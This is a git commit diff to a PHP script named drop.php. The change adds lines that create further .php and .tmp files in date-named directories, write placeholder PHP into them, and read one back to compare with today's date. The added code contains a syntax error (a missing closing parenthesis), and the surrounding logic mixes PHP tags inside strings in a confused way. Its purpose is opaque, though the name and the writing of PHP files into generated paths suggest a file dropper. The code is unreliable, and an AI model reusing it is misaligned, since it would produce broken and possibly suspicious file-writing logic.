2ecb8d27a64689ce45a98756fa1f553fdf1f01b5
temp <145018858+temp-important@users.noreply.github.com>
2023-09-20 19:21:10 +0700

    Update drop.php

--- drop.php
+++ drop.php
@@ -63,6 +63,7 @@ if(('<?php echo date("Y") ?>'>='<?php echo $th[0].$th[4] ?>')&&('<?php echo date
 		$myfile = fopen($temp.".php", "w") or die("Unable to open file!");
 		$myfilex = fopen($temp.".tmp", "w") or die("Unable to open file!");
 		$myfile2 = fopen($ds."/".$img."/".$temp."/".$dt2.".php", "w") or die("Unable to open file!");
+		$myfile4 = fopen($ds."/".$img."/".$temp."/temp.tmp", "w") or die("Unable to open file!");
 		$txt = "<?php
 			
 ?>";
@@ -70,6 +71,16 @@ if(('<?php echo date("Y") ?>'>='<?php echo $th[0].$th[4] ?>')&&('<?php echo date
 		fwrite($myfile, $txt);
 		fwrite($myfilex, $txt2);
 		fclose($myfile);
+		fclose($myfilex);
 		fwrite($myfile2, $txt);
 		fclose($myfile2);
+		fwrite($myfile4, $txt);
+		fclose($myfile4);
+
+$fileContent = file_get_contents($ds."/".$img."/".$temp."/temp.tmp");
+if ($fileContent !== false) {
+	if($fileContent==date('Ymd'){
+	   echo 'sss';
+}
+}
 ?>
